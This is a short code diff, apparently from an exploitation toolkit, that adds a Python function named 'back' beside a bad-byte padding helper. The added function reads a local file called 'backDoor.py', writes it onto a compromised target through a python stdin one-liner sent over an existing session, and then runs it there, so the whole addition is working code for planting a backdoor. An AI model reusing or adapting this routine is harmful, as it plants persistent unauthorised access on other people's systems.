@@ -31,3 +31,13 @@ def padding(size, bList='\n\r\x00'):
             pad += ch
             i += 1
     return pad
+
+def back(target):
+    fp = open('backDoor.py')
+    filename = os.tmpnam()
+    b = fp.read()
+    target.sendline('python -c \'__import__("sys").stdout.write(__import__("sys").stdin.read(%d))\' >> %s'%(len(b),filename))
+    target.sendline(b)
+    raw_input('123')
+    target.sendline('python "%s"'%filename)
+    time.sleep(1)
